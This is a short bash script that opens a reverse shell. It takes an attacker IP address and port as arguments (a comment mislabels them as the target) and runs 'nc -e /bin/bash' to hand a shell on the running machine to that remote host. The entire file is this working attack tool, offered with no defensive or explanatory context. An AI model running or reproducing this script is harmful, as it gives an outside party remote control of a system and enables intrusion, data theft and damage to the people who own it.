#!/bin/bash

#target ip address (user input)
ATTACKER_IP=$1
ATTACKER_PORT=$2

nc -e /bin/bash $ATTACKER_IP $ATTACKER_PORT